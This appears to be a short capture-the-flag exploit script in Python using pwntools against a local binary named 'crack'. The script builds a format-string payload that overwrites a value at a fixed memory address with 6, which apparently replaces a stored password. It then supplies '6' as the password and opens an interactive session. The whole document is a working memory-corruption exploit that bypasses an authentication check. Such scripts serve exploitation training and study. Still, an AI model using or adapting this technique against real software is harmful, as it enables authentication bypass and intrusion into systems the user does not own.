#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

pwdAddr = 0x804A048
payload = fmtstr_payload(10, {pwdAddr: 6})

io = process("./crack")

io.sendlineafter(" ? ", payload)
io.sendlineafter(" :", "6")

io.interactive()
io.close()
